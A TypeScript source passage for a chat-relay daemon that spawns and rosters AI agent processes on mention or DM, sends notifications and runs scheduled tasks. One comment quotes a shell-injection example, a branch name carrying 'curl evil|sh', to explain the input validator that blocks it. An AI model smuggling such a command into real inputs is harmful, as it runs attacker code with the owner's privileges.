#!/usr/bin/env node
import net from "node:net";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFile, execSync, spawn } from "node:child_process";
import {
  CapabilityClient,
  RelayConnection,
  getKey,
  resolveRelays,
  DM_FUZZ_WINDOW_S,
  KIND_AGENT_METADATA,
  KIND_AGENT_ATTESTATION,
  KIND_CHANNEL_MESSAGE,
  KIND_DOC_COMMENT,
  KIND_MEMBERSHIP,
  ROSTER_D,
  KIND_GIFT_WRAP,
  KIND_OBSERVER,
  makeChannels,
} from "@fezchat/protocol";

/**
 * fez-sentinel — the always-on half of fez, extracted from the TUI so
 * the fleet works with no window open (Buzz's shape: buzz-acp is a
 * standing daemon and docker restarts it; here the smart inner program
 * is this service and the babysitter is whatever the operator has —
 * the herdr plugin, launchd, a shell). Run with `fez sentinel`.
 *
 * Duties (all relay-subscription-driven — the relay is the only
 * control plane, there is no client→sentinel command channel):
 *   - DM summons: kind-1059 gift wraps addressed to a local persona's
 *     pubkey wake it (sender/content/depth are encrypted — spawning is
 *     speculative; the agent gates the DM, idleExit reaps mistakes).
 *   - Mention summons: @name from the owner or an attested sibling
 *     spawns the persona into the mentioned channel, invites it when
 *     its 47000 appears, and attests it as a sibling.
 *   - Desktop notifications: DMs to the owner, mentions of the owner,
 *     failed agent turns — via herdr's notification.show, falling back
 *     to macOS osascript.
 *
 * Spawning goes through herdr when its socket answers (tab per agent,
 * shared ~/.fez/herdr-tabs.json registry — the TUI sidebar keeps
 * showing them); otherwise a detached `fez agent` child with logs in
 * ~/.fez/logs/. A pidfile at ~/.fez/sentinel.pid lets the TUI
 * extensions defer to the sentinel instead of double-firing.
 */

/**
 * A string safe to interpolate into a SHELL COMMAND — the repo/line an
 * agent is summoned onto reach a live terminal via herdr, so they are
 * validated like git validates refs: letters, digits, dot, dash, slash,
 * underscore, no `..`, bounded length. Not escaped — REFUSED. Exported
 * so the source (workContextOf) and the sink (agentEnvCmd) share ONE
 * definition of "safe", which is what keeps the boundary from drifting.
 */
export function isSafeWork(value: string | undefined): boolean {
  return !!value && /^[\w][\w./-]{0,200}$/.test(value) && !value.includes("..");
}

const HERDR_SOCKET = path.join(os.homedir(), ".config", "herdr", "herdr.sock");
const REGISTRY = path.join(os.homedir(), ".fez", "herdr-tabs.json");
const PIDFILE = path.join(os.homedir(), ".fez", "sentinel.pid");
const LOG_DIR = path.join(os.homedir(), ".fez", "logs");
const MAX_CHAIN_DEPTH = 5;

// ── herdr socket (one request per connection, same shape as fez-herdr) ──
function herdrCall(method: string, params: Record<string, unknown>): Promise<Record<string, unknown>> {
  return new Promise((resolve, reject) => {
    const sock = net.connect(HERDR_SOCKET);
    let buf = "";
    sock.on("error", reject);
    sock.on("data", (chunk) => {
      buf += chunk.toString();
      if (!buf.includes("\n")) return;
      sock.end();
      try {
        const msg = JSON.parse(buf.slice(0, buf.indexOf("\n")));
        if (msg.error) reject(new Error(`${msg.error.code}: ${msg.error.message}`));
        else resolve(msg.result ?? {});
      } catch (err) {
        reject(err instanceof Error ? err : new Error(String(err)));
      }
    });
    sock.on("connect", () => sock.write(JSON.stringify({ id: "sentinel", method, params }) + "\n"));
    setTimeout(() => {
      sock.destroy();
      reject(new Error("herdr socket timeout"));
    }, 4000).unref?.();
  });
}

let herdrAliveCache: { verdict: boolean; at: number } = { verdict: false, at: 0 };
async function herdrAlive(): Promise<boolean> {
  if (Date.now() - herdrAliveCache.at < 10_000) return herdrAliveCache.verdict;
  const verdict = await herdrCall("ping", {}).then(() => true).catch(() => false);
  herdrAliveCache = { verdict, at: Date.now() };
  return verdict;
}

// ── notifications: herdr toast, else macOS ──────────────────────────────
let lastNotifyAt = 0;
function deliver(title: string, body: string): void {
  const now = Date.now();
  if (now - lastNotifyAt < 2000) return; // flood guard
  lastNotifyAt = now;
  void herdrCall("notification.show", { title, body, sound: "request" })
    .then((result) => {
      if ((result as { shown?: boolean }).shown === false) throw new Error("herdr notifications disabled");
    })
    .catch(() => {
      if (process.platform !== "darwin") return;
      const esc = (s: string) => s.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
      execFile("osascript", ["-e", `display notification "${esc(body)}" with title "${esc(title)}"`], () => {});
    });
}

// ── registry shared with the fez-herdr TUI extension ────────────────────
interface RegisteredTab {
  persona: string;
  channels: string[];
  tabId: string;
  paneId: string;
  /** Thread-scoped work: the repo + line this instance was cut onto. */
  work?: { repo: string; line?: string };
}
function loadRegistry(): RegisteredTab[] {
  try {
    const raw = JSON.parse(fs.readFileSync(REGISTRY, "utf-8")) as (RegisteredTab & { channel?: string })[];
    return raw.map((t) => ({ ...t, channels: t.channels ?? (t.channel ? [t.channel] : []) }));
  } catch {
    return [];
  }
}
function saveRegistry(tabs: RegisteredTab[]): void {
  fs.mkdirSync(path.dirname(REGISTRY), { recursive: true });
  fs.writeFileSync(REGISTRY, JSON.stringify(tabs, null, 2), "utf-8");
}

// ── persona/process facts ───────────────────────────────────────────────
function personaExists(name: string): boolean {
  try {
    const raw = fs.readFileSync(path.join(os.homedir(), ".fez", "personas", `${name}.md`), "utf-8");
    const harness = raw.match(/^harness:\s*(.+)$/m)?.[1]?.trim();
    return harness !== undefined && harness !== "router";
  } catch {
    return false;
  }
}
function agentProcessAlive(persona: string): boolean {
  try {
    execSync(`pgrep -f "(fez|cli\\.js) agent ${persona}"`, { stdio: "pipe" });
    return true;
  } catch {
    return false;
  }
}

async function main() {
  // BEFORE anything shells out. launchd hands this process
  // PATH=/usr/bin:/bin:/usr/sbin:/sbin, so Homebrew, uv, cargo and nvm
  // are all invisible — and an extension that shells out reports the
  // tool as "not installed" when it is sitting right there. Adopting the
  // login shell's PATH once fixes every extension at once, including
  // ones written by people who never hit this.
  const { adoptUserPath } = await import("@fezchat/protocol");
  adoptUserPath();

  const keyHex = getKey("default");
  if (!keyHex) {
    console.error("No fez identity (fez keygen first) — the sentinel signs invites/attestations as you.");
    process.exit(1);
  }
  const relayUrls = resolveRelays();
  const client = new CapabilityClient({ relay: relayUrls, privateKey: keyHex });
  const relay = new RelayConnection({ urls: relayUrls, authSigner: client.authSigner });
  await relay.connect();
  const myPubkey = client.getPubkey();

  fs.mkdirSync(path.dirname(PIDFILE), { recursive: true });
  fs.writeFileSync(PIDFILE, String(process.pid));
  const cleanup = () => {
    try {
      if (fs.readFileSync(PIDFILE, "utf-8").trim() === String(process.pid)) fs.unlinkSync(PIDFILE);
    } catch { /* already gone */ }
  };
  process.on("SIGINT", () => { cleanup(); relay.disconnect(); console.log("\n🔴 sentinel stopped."); process.exit(0); });
  process.on("SIGTERM", () => { cleanup(); process.exit(0); });
  process.on("exit", cleanup);

  console.log(`🛡  fez sentinel on ${relayUrls.join(", ")} (owner ${myPubkey.slice(0, 12)}…)`);
  console.log(`   herdr: ${(await herdrAlive()) ? "connected — agents spawn as tabs" : "absent — agents spawn as detached processes"}`);

  // ── spawn paths ───────────────────────────────────────────────────────
  const agentEnvCmd = (persona: string, channels: string[], work?: { repo: string; line?: string }) => {
    // The SINK: this string is typed into a live shell (herdr
    // pane.send_text). Validating HERE, not only where `work` is built,
    // is what makes the guard hold against a future caller that
    // constructs a work object some other way — the boundary is the
    // shell, so the check lives at the shell. Unsafe input is a bug in
    // the caller, so throw rather than silently drop.
    if (work && !isSafeWork(work.repo)) throw new Error(`unsafe repo name refused: ${work.repo}`);
    if (work?.line && !isSafeWork(work.line)) throw new Error(`unsafe line name refused: ${work.line}`);
    return (
      `FEZ_AGENT_OWNER=${myPubkey} FEZ_RELAY=${relayUrls.join(",")}` +
      (work ? ` FEZ_AGENT_REPO=${work.repo}${work.line ? ` FEZ_AGENT_BASE_BRANCH=${work.line}` : ""}` : "") +
      ` fez agent ${persona} -c ${channels.length > 0 ? channels.join(",") : "none"}`
    );
  };

  async function spawnAgent(persona: string, channels: string[], work?: { repo: string; line?: string }): Promise<void> {
    if (await herdrAlive()) {
      const registered = loadRegistry();
      const prior = registered.find((t) => t.persona === persona);
      if (prior) await herdrCall("tab.close", { tab_id: prior.tabId }).catch(() => {});
      const created = await herdrCall("tab.create", { label: `fez:${persona}`, cwd: os.homedir(), focus: false });
      const tab = created.tab as { tab_id: string };
      const pane = created.root_pane as { pane_id: string };
      await herdrCall("pane.send_text", { pane_id: pane.pane_id, text: agentEnvCmd(persona, channels, work) + "\n" });
      saveRegistry([...registered.filter((t) => t.persona !== persona), { persona, channels, tabId: tab.tab_id, paneId: pane.pane_id, work }]);
      console.log(`🧬 spawned @${persona} in herdr tab ${tab.tab_id} (${channels.length > 0 ? channels.join(",") : "dm-only"})`);
    } else {
      fs.mkdirSync(LOG_DIR, { recursive: true });
      const log = fs.openSync(path.join(LOG_DIR, `${persona}.log`), "a");
      const child = spawn("fez", ["agent", persona, "-c", channels.length > 0 ? channels.join(",") : "none"], {
        env: {
          ...process.env,
          FEZ_AGENT_OWNER: myPubkey,
          FEZ_RELAY: relayUrls.join(","),
          ...(work ? { FEZ_AGENT_REPO: work.repo, ...(work.line ? { FEZ_AGENT_BASE_BRANCH: work.line } : {}) } : {}),
        },
        detached: true,
        stdio: ["ignore", log, log],
      });
      child.unref();
      console.log(`🧬 spawned @${persona} detached (pid ${child.pid}, log ~/.fez/logs/${persona}.log)`);
    }
  }

  // ── rosters ───────────────────────────────────────────────────────────
  const agentPkToName = new Map<string, string>(); // pubkey -> announced name
  const attestedSiblings = new Set<string>();
  const attested = new Set<string>();
  const nameOf = (pk: string) => agentPkToName.get(pk) ?? `${pk.slice(0, 8)}…`;

  function buildTaskNostr() {
    return {
      pubkey: myPubkey,
      publish: async (template: unknown) => {
        const event = client.signEvent(template as never);
        await relay.publish(event);
        return event;
      },
      // Sign WITHOUT publishing — NIP-98 headers for relay HTTP
      // surfaces (fez-git's push journal). Its absence here was
      // invisible: the backend is cast into the extension API type, so
      // the type checker saw the full NostrAccess while the object had
      // a hole, and the first caller got a TypeError swallowed by its
      // own network-error handling — a task that no-ops forever.
      signEvent: (template: unknown) => client.signEvent(template as never),
      subscribe: (filters: unknown, handler: unknown) => relay.subscribe(filters as never, handler as never),
      query: (filters: unknown) => relay.query(filters as never),
      encrypt: (peer: string, plaintext: string) => client.encryptTo(peer, plaintext),
      decrypt: (peer: string, ciphertext: string) => client.decryptFrom(peer, ciphertext),
    };
  }

  function attestAgent(agentPubkey: string): void {
    if (attested.has(agentPubkey) || agentPubkey === myPubkey) return;
    attested.add(agentPubkey);
    attestedSiblings.add(agentPubkey);
    void relay
      .publish(client.signEvent({ kind: KIND_AGENT_ATTESTATION, tags: [["p", agentPubkey]], content: "" }))
      .catch(() => attested.delete(agentPubkey));
  }

  /**
   * Add a spawned agent to the WORKSPACE roster — one roster, so the
   * agent lands with access to every channel rather than being invited
   * per room. created_at is bumped past the current roster so two
   * invites in the same second can't tie.
   */
  async function inviteToWorkspace(agentPubkey: string): Promise<void> {
    const rosters = await relay.query([{ kinds: [KIND_MEMBERSHIP], "#d": [ROSTER_D] }]);
    const latest = rosters.sort((a, b) => a.created_at - b.created_at).at(-1);
    const ptags = latest?.tags.filter((t) => t[0] === "p") ?? [];
    if (ptags.some((t) => t[1] === agentPubkey)) return;
    ptags.push(["p", agentPubkey, "bot"]);
    await relay.publish(
      client.signEvent({
        kind: KIND_MEMBERSHIP,
        tags: [["d", ROSTER_D], ...ptags],
        content: "",
        created_at: Math.max(Math.floor(Date.now() / 1000), (latest?.created_at ?? 0) + 1),
      })
    );
  }

  const [metadataEvents, attestations] = await Promise.all([
    relay.query([{ kinds: [KIND_AGENT_METADATA], limit: 200 }]),
    relay.query([{ kinds: [KIND_AGENT_ATTESTATION], authors: [myPubkey] }]),
  ]);
  for (const event of metadataEvents) {
    try {
      const name = JSON.parse(event.content).name?.toLowerCase();
      if (name) agentPkToName.set(event.pubkey, name);
    } catch { /* ignore */ }
  }
  for (const event of attestations) {
    const pk = event.tags.find((t) => t[0] === "p")?.[1];
    if (pk) attestedSiblings.add(pk);
  }
  console.log(`   roster: ${agentPkToName.size} announced agent(s), ${attestedSiblings.size} attested sibling(s)`);

  // ── watchers ──────────────────────────────────────────────────────────
  const spawning = new Set<string>();
  const pendingInvites = new Map<string, { channelId: string }>();
  const seenDmIds = new Set<string>();
  const sessionStartS = Math.floor(Date.now() / 1000);
  let dmWatchLive = false;
  setTimeout(() => { dmWatchLive = true; }, 5000).unref?.();

  // Each persona's own pubkey (derived from its service key), cached. Used
  // to reject SELF-SUMMONS: an agent's own channel post must never summon
  // it. A persona that dies on spawn posts a "failed to start" message; if
  // that post mentions the agent, the sentinel would re-summon it, which
  // dies and posts again — the researcher flood. This is the reliable
  // guard even before the agent has announced (agentPkToName is empty then).
  const personaPkCache = new Map<string, string>();
  async function personaPubkey(persona: string): Promise<string | undefined> {
    const hit = personaPkCache.get(persona);
    if (hit) return hit;
    try {
      const { loadOrCreateKey } = await import("@fezchat/protocol");
      const { getPublicKey } = await import("nostr-tools/pure");
      const hexKey = loadOrCreateKey(`agent:${persona}`);
      const pk = getPublicKey(Uint8Array.from(hexKey.match(/../g)!.map((b) => parseInt(b, 16))));
      personaPkCache.set(persona, pk);
      return pk;
    } catch {
      return undefined;
    }
  }

  // Flood backstop: the same persona can't be summoned more than once per
  // window, whatever the trigger. The self-summon guard breaks the known
  // loop; this caps any other runaway (a mention storm, a future bug) so a
  // spawn that keeps dying can't hammer the channel. A human re-mentioning
  // after the window still summons normally.
  const lastSummonAt = new Map<string, number>();
  const SUMMON_COOLDOWN_MS = 15_000;

  function summon(persona: string, channels: string[], why: string, work?: { repo: string; line?: string }): void {
    if (spawning.has(persona) || !personaExists(persona) || agentProcessAlive(persona)) return;
    const last = lastSummonAt.get(persona);
    if (last !== undefined && Date.now() - last < SUMMON_COOLDOWN_MS) {
      console.log(`⏳ summon for @${persona} suppressed — ${Math.ceil((SUMMON_COOLDOWN_MS - (Date.now() - last)) / 1000)}s cooldown (${why})`);
      return;
    }
    lastSummonAt.set(persona, Date.now());
    spawning.add(persona);
    console.log(`✨ ${why} → summoning @${persona}${work ? ` onto ${work.repo}:${work.line}` : ""}`);
    void preInvite(persona)
      .then(() => spawnAgent(persona, channels, work))
      .then(() => {
        spawning.delete(persona);
        armSpawnWatchdog(persona, channels[0]);
      })
      .catch((err) => {
        spawning.delete(persona);
        console.error(`⚠️  couldn't summon @${persona}: ${err instanceof Error ? err.message : err}`);
      });
  }

  /**
   * The backstop for deaths the runtime cannot self-report — node
   * missing in the tab's shell, the command never running at all. The
   * runtime's own dying words (agent.ts main().catch) cover everything
   * after it starts; this covers "it never started". One check, 90s
   * after spawn: no announcement AND no process = say so in the channel
   * that summoned it, as the owner — the silence that looked like
   * slowness twice today must never be silent again.
   */
  function armSpawnWatchdog(persona: string, channelId: string | undefined): void {
    if (!channelId) return;
    setTimeout(() => {
      if (!pendingInvites.has(persona) || agentProcessAlive(persona)) return;
      pendingInvites.delete(persona);
      console.error(`⚠️  @${persona} never started (no announce, no process)`);
      void relay
        .publish(
          client.signEvent({
            kind: KIND_CHANNEL_MESSAGE,
            tags: [["h", channelId]],
            content: `⚠️ \`${persona}\` failed to start — its process died before announcing (check its herdr tab or ~/.fez/logs/${persona}.log)`,
          })
        )
        .catch(() => {});
    }, 90_000);
  }

  /**
   * Roster the persona BEFORE its process exists.
   *
   * Agent keys are stable (agent:<name>, minted here if this is truly
   * the first time), so the sentinel need not wait for the 47000
   * announcement to know who to invite — and waiting cost a real
   * afternoon: a repo agent's FIRST act is cloning, the clone is
   * roster-gated, and the announce-then-invite order meant every cold
   * spawn with a checkout died 403 in a tab nobody was watching. The
   * announcement-driven invite stays (it covers agents summoned by
   * other paths); this closes the gap for the ones we spawn ourselves.
   */
  async function preInvite(persona: string): Promise<void> {
    try {
      const { loadOrCreateKey } = await import("@fezchat/protocol");
      const { getPublicKey } = await import("nostr-tools/pure");
      const hexKey = loadOrCreateKey(`agent:${persona}`);
      const pk = getPublicKey(Uint8Array.from(hexKey.match(/../g)!.map((b) => parseInt(b, 16))));
      await inviteToWorkspace(pk);
      attestAgent(pk);
    } catch (err) {
      // A failed pre-invite must not block the summon: the announce-time
      // invite is still behind it, and a chat-only agent never needed one.
      console.warn(`⚠️  pre-invite for @${persona} failed: ${err instanceof Error ? err.message : err}`);
    }
  }

  /**
   * The thread a mention lands in IS the assignment. A branch thread's
   * root carries its marker (⑂ `name`, written by fez-git's thread task
   * or /repo branch); a mention under it means "work here" — so the
   * spawn is handed the repo (from the channel) and the LINE (from the
   * root), and the workspace provider cuts `agent/<line>` from the
   * line's tip. A mention outside any ⑂ thread summons exactly as
   * before. Resolution is best-effort: if the root or channel can't be
   * read, the summon proceeds without work context rather than not at
   * all — an agent in the room beats an agent held up by a lookup.
   */
  /**
   * A name that may ride into a SHELL COMMAND. agentEnvCmd types the
   * work context into a live terminal via herdr, so these strings are
   * validated like the git endpoints validate refs — not quoted, not
   * escaped, REFUSED. A thread root is member-authored text; without
   * this, ``⑂ \`main; curl evil|sh\` `` executed as the owner the
   * moment anyone mentioned an agent under it (review finding F1).
   */
  const safeWork = (value: string | undefined): string | undefined =>
    isSafeWork(value) ? value : undefined;

  async function workContextOf(event: { tags: string[][] }, channelId: string): Promise<{ repo: string; line?: string } | undefined> {
    try {
      // The CHANNEL picks the repo: a mention anywhere in a repo channel
      // assigns that repo, overriding the persona's standing default —
      // an agent answering in #another-test while working cool-repo is
      // exactly the confusion this exists to prevent.
      //
      // authors: the key this sentinel serves — every sibling consumer
      // of 47101 filters by the owner, and an unfiltered query let ANY
      // pubkey's forged channel event pick the repo on a non-enforcing
      // relay (review finding F3). Defense in depth; the relay's
      // membership policy is the first wall, not the only one.
      const chans = (await relay.query([{ kinds: [47101], "#d": [channelId], authors: [myPubkey] }] as never)) as { created_at: number; content: string }[];
      const latest = chans.sort((a, b) => b.created_at - a.created_at)[0];
      if (!latest) return undefined;
      const parsed = JSON.parse(latest.content) as { source?: string; meta?: { repo?: string } };
      if (parsed.source !== "fez-git") return undefined;
      const repo = safeWork(parsed.meta?.repo);
      if (!repo) return undefined;

      // The THREAD picks the line, when the mention is inside a ⑂ root.
      const eTags = event.tags.filter((t) => t[0] === "e" && t[1]);
      const rootId = (eTags.find((t) => t[3] === "root") ?? eTags[0])?.[1];
      if (!rootId) return { repo };
      const [root] = await relay.query([{ ids: [rootId] }] as never);
      const marker = (root as { content?: string } | undefined)?.content?.match(/^⑂ `([^`]+)`/);
      if (!marker) return { repo };
      const branch = marker[1];
      const line = safeWork(branch.includes("/") ? branch.slice(branch.indexOf("/") + 1) : branch);
      // An unsafe line name degrades to repo-only context — the summon
      // still happens, on the agent's default lane, and nothing of the
      // hostile string survives to the shell.
      return line ? { repo, line } : { repo };
    } catch {
      return undefined;
    }
  }

  async function handleChannelMentions(event: { pubkey: string; content: string; tags: string[][] }, channelId: string): Promise<void> {
    // The sentinel's own posts (e.g. the spawn watchdog's "failed to start"
    // note) name agents but must never summon them — otherwise the status
    // message re-triggers the very spawn it reported dead.
    if (event.pubkey === myPubkey) return;
    const work = await workContextOf(event, channelId);
    for (const match of event.content.matchAll(/@([\w-]+)/g)) {
      const persona = match[1].toLowerCase();
      if (spawning.has(persona) || !personaExists(persona)) continue;
      // An agent mentioning ITSELF (its dying "failed to start" words, or
      // any self-reference) is not a summon — else a spawn-death loops.
      if ((await personaPubkey(persona)) === event.pubkey) continue;
      if (agentProcessAlive(persona)) {
        // Running, but summoned into a channel it doesn't serve — or
        // onto a DIFFERENT line: one process per persona, one body per
        // line, so a line switch is a restart. Its previous branch is
        // safe on the relay; pushed work is the only work that exists.
        const entry = loadRegistry().find((t) => t.persona === persona);
        const needsChannel = entry && !entry.channels.includes(channelId);
        const needsLine = entry && work && (entry.work?.repo !== work.repo || (work.line !== undefined && entry.work?.line !== work.line));
        if (entry && (needsChannel || needsLine)) {
          spawning.add(persona);
          pendingInvites.set(persona, { channelId });
          console.log(needsLine ? `🔁 moving @${persona} onto line ${work?.line} (restart)` : `🔁 pulling @${persona} into a new channel (restart with union)`);
          try { execSync(`pkill -f "(fez|cli\\.js) agent ${persona}"`, { stdio: "pipe" }); } catch { /* already gone */ }
          void spawnAgent(persona, needsChannel ? [...entry.channels, channelId] : entry.channels, work ?? entry.work)
            .then(() => spawning.delete(persona))
            .catch(() => spawning.delete(persona));
        }
        continue;
      }
      pendingInvites.set(persona, { channelId });
      summon(persona, [channelId], `mention by ${nameOf(event.pubkey)}`, work);
    }
  }

  relay.subscribe(
    [
      { kinds: [KIND_CHANNEL_MESSAGE], since: sessionStartS },
      { kinds: [KIND_DOC_COMMENT], since: sessionStartS },
      { kinds: [KIND_AGENT_METADATA], since: sessionStartS },
      { kinds: [KIND_GIFT_WRAP], since: sessionStartS - DM_FUZZ_WINDOW_S },
      { kinds: [KIND_OBSERVER], "#p": [myPubkey] },
    ],
    (event) => {
      if (event.kind === KIND_AGENT_METADATA) {
        let name: string | undefined;
        try {
          name = JSON.parse(event.content).name?.toLowerCase();
        } catch { return; }
        if (!name) return;
        agentPkToName.set(event.pubkey, name);
        if (loadRegistry().some((t) => t.persona === name)) attestAgent(event.pubkey);
        const target = pendingInvites.get(name);
        if (target) {
          pendingInvites.delete(name);
          attestAgent(event.pubkey);
          void inviteToWorkspace(event.pubkey)
            .then(() => console.log(`🤝 @${name} announced — invited to its channel`))
            .catch(() => console.warn(`⚠️  invite for @${name} failed`));
        }
        return;
      }

      // Doc comments (40101): a comment that @mentions an agent is work
      // handed over inside a document — same summons authority as chat,
      // but the agent answers in the doc, never in the channel.
      if (event.kind === KIND_DOC_COMMENT) {
        if (event.pubkey !== myPubkey && event.tags.some((t) => t[0] === "p" && t[1] === myPubkey)) {
          deliver(`@${nameOf(event.pubkey)} commented on a doc`, event.content.slice(0, 90));
        }
        if (event.pubkey !== myPubkey && !attestedSiblings.has(event.pubkey)) return;
        const channelId = event.tags.find((t) => t[0] === "h")?.[1];
        if (!channelId) return;
        for (const match of event.content.matchAll(/@([\w-]+)/g)) {
          const persona = match[1].toLowerCase();
          if (spawning.has(persona) || !personaExists(persona) || agentProcessAlive(persona)) continue;
          pendingInvites.set(persona, { channelId });
          summon(persona, [channelId], `doc comment by ${nameOf(event.pubkey)}`);
        }
        return;
      }

      if (event.kind === KIND_CHANNEL_MESSAGE) {
        // Mention-of-owner notification (someone else p-tagged us).
        if (event.pubkey !== myPubkey && event.tags.some((t) => t[0] === "p" && t[1] === myPubkey)) {
          deliver(`@${nameOf(event.pubkey)} mentioned you`, event.content.slice(0, 90));
        }
        // Summons authority: the owner and attested siblings only.
        if (event.pubkey !== myPubkey && !attestedSiblings.has(event.pubkey)) return;
        if (Number(event.tags.find((t) => t[0] === "depth")?.[1] ?? 0) >= MAX_CHAIN_DEPTH) return;
        const channelId = event.tags.find((t) => t[0] === "h")?.[1];
        if (!channelId) return;
        void handleChannelMentions(event, channelId);
        return;
      }

      if (event.kind === KIND_GIFT_WRAP) {
        if (!dmWatchLive) return; // replayed history — agents ignore stale DMs anyway
        const recipient = event.tags.find((t) => t[0] === "p")?.[1];
        if (!recipient) return;
        if (recipient === myPubkey) {
          const dm = client.unwrapDm(event);
          if (dm && dm.senderPk !== myPubkey && dm.ts >= sessionStartS && !seenDmIds.has(dm.id)) {
            seenDmIds.add(dm.id);
            deliver(`✉️ DM from ${nameOf(dm.senderPk)}`, dm.text.slice(0, 90));
          }
          return;
        }
        const persona = agentPkToName.get(recipient);
        if (!persona) return;
        const prior = loadRegistry().find((t) => t.persona === persona);
        summon(persona, prior?.channels ?? [], "DM for a sleeping agent");
        return;
      }

      // Observer frame — failed turns rate a toast.
      try {
        const frame = JSON.parse(client.decryptFrom(event.pubkey, event.content)) as { type?: string; status?: string };
        if (frame.type === "turn" && frame.status === "failed") {
          const agent = event.tags.find((t) => t[0] === "agent")?.[1] ?? nameOf(event.pubkey);
          deliver(`⚠️ @${agent} turn failed`, "Check its herdr tab / ~/.fez/logs for the failure notice.");
        }
      } catch { /* not ours */ }
    }
  );

  // ── Scheduled messages (40006) + reminders (40007): the TUI records
  // the intent; we execute at the appointed time — publish the real
  // channel message (signed as the owner, whose key we run with) or
  // fire the notification — then tombstone the intent (kind 5) so a
  // restart never refires it. Overdue intents (we were down) fire
  // immediately on hydrate.
  const KIND_SCHEDULED = 40006;
  const KIND_REMINDER = 40007;
  const KIND_CHANNEL_MSG = 47103;
  const armedTimers = new Map<string, ReturnType<typeof setTimeout>>();
  const firedIntents = new Set<string>();

  type IntentEvent = { id: string; kind: number; content: string; tags: string[][] };

  // Reminders (40007) arrive NIP-44 self-encrypted — note, fire time, and
  // subject in the ciphertext (they're private data on a public relay).
  // We hold the same key, so decrypt to arm. Legacy plaintext reminders
  // (remind_at tag + cleartext note) still decode via the fallback.
  function decodeReminder(intent: IntentEvent): { note: string; at: number } {
    try {
      const payload = JSON.parse(client.decryptFrom(myPubkey, intent.content)) as { note?: string; remind_at?: number };
      if (typeof payload.remind_at === "number") {
        return { note: payload.note || "(reminder)", at: payload.remind_at };
      }
    } catch { /* legacy plaintext form */ }
    return { note: intent.content || "(reminder)", at: Number(intent.tags.find((t) => t[0] === "remind_at")?.[1]) };
  }

  async function fireIntent(intent: IntentEvent): Promise<void> {
    armedTimers.delete(intent.id);
    if (firedIntents.has(intent.id)) return;
    firedIntents.add(intent.id);
    if (intent.kind === KIND_SCHEDULED) {
      const h = intent.tags.find((t) => t[0] === "h")?.[1];
      const c = intent.tags.find((t) => t[0] === "c")?.[1];
      if (h && c) {
        await relay.publish(client.signEvent({ kind: KIND_CHANNEL_MSG, tags: [["h", h]], content: intent.content }));
        console.log(`⏲ delivered scheduled message to channel ${h.slice(0, 8)}…`);
      }
    } else {
      const { note } = decodeReminder(intent);
      deliver("⏰ reminder", note);
      console.log(`⏰ fired reminder: ${note.slice(0, 60)}`);
    }
    await relay.publish(client.signEvent({ kind: 5, tags: [["e", intent.id]], content: "" })).catch(() => {});
  }

  function armIntent(intent: IntentEvent): void {
    if (firedIntents.has(intent.id) || armedTimers.has(intent.id)) return;
    const at =
      intent.kind === KIND_REMINDER
        ? decodeReminder(intent).at
        : Number(intent.tags.find((t) => t[0] === "send_at")?.[1]);
    if (!at) return;
    const delayMs = Math.min(Math.max(0, at * 1000 - Date.now()), 2 ** 31 - 1);
    armedTimers.set(intent.id, setTimeout(() => void fireIntent(intent), delayMs));
    console.log(`⏲ armed ${intent.kind === KIND_SCHEDULED ? "scheduled message" : "reminder"} (fires in ${Math.round(delayMs / 1000)}s)`);
  }

  relay.subscribe([{ kinds: [KIND_SCHEDULED, KIND_REMINDER], authors: [myPubkey], since: sessionStartS }], (event) =>
    armIntent(event)
  );
  const [intents, tombstones] = await Promise.all([
    relay.query([{ kinds: [KIND_SCHEDULED, KIND_REMINDER], authors: [myPubkey] }]),
    relay.query([{ kinds: [5], authors: [myPubkey] }]),
  ]);
  const dead = new Set(tombstones.flatMap((t) => t.tags.filter((x) => x[0] === "e").map((x) => x[1])));
  for (const intent of intents) if (!dead.has(intent.id)) armIntent(intent);

  // ── extension background tasks ────────────────────────────────────────
  // The sentinel is the only always-on, key-holding host, so it's where
  // an extension's scheduled work belongs (a live block that refreshes
  // itself, a nightly bench run). Extensions get the relay and the
  // owner's identity — no UI, no shell. A task that throws is logged and
  // retried next tick; it can never take the sentinel down.
  await (async () => {
   try {
    const { loadExtensions, registeredScheduledTasks, setNostrBackend, setWorkspaceBackend, loadSettings, fetchRelayInfo } =
      await import("@fezchat/protocol");
    setNostrBackend(buildTaskNostr() as never);
    // Which workspace this is, and who owns it. The sentinel has no
    // FezClient, so without this the extension API had nowhere to learn
    // the owner and fell back to "the local key" — meaning a sentinel
    // pointed at someone else's relay believed it owned the place, and
    // every channel it tried to open was refused with no explanation.
    // An unreadable NIP-11 leaves the owner undefined, which is the
    // honest answer: seams that need one go quiet instead of guessing.
    //
    // Resolved lazily and RETRIED, not fetched once at boot. The sentinel
    // starts at login, so it races the relay coming up — and a one-shot
    // read that lost that race would leave the owner unknown for the
    // whole process lifetime, silently disabling channel creation for
    // every scheduled task until somebody restarted it.
    let workspaceOwner: string | undefined;
    const resolveOwner = async (): Promise<string | undefined> => {
      if (workspaceOwner) return workspaceOwner;
      const info = await fetchRelayInfo(relayUrls[0]);
      if (info?.pubkey) {
        workspaceOwner = info.pubkey;
        setWorkspaceBackend({
          relayUrl: relayUrls[0],
          owner: workspaceOwner,
          info: info as Record<string, unknown>,
        });
        console.log(`   ⏱  workspace owner ${workspaceOwner.slice(0, 12)}…`);
      }
      return workspaceOwner;
    };
    await resolveOwner();
    if (!workspaceOwner) {
      // No owner means no channel, roster or ban event can be valid here,
      // so nothing a scheduled task publishes into a channel would count.
      // Saying so once beats every bridge failing quietly on its own.
      console.log("   ⏱  relay is unclaimed (no owner in NIP-11) — channel-scoped tasks cannot publish");
    }
    // Only extensions that ASKED for background life (fez.parts.background
    // in their manifest, recorded at install time) run here.
    const background = (loadSettings() as { backgroundExtensions?: string[] }).backgroundExtensions ?? [];
    if (background.length === 0) {
      console.log("   ⏱  no background extensions installed");
      return;
    }
    await loadExtensions(undefined, background);
    const tasks = registeredScheduledTasks();
    for (const task of tasks) {
      const everyMs = Math.max(60_000, task.everyMs);
      let lastTickAt = Date.now();
      const tick = async () => {
        // A gap far longer than the interval means the machine slept.
        const missedWindow = Date.now() - lastTickAt > everyMs * 2;
        lastTickAt = Date.now();
        try {
          // One nostr per tick, and the channels seam built over it —
          // so a bridge says "open the channel for this repo" instead of
          // copying kind numbers out of src/kinds.ts.
          //
          // The channels seam is keyed on the WORKSPACE owner from
          // NIP-11, not this machine's key. They are the same on your own
          // relay and different on anyone else's, and using the local key
          // there fails silently in both directions: list() queries
          // `authors: [owner]` and comes back empty, so a bridge decides
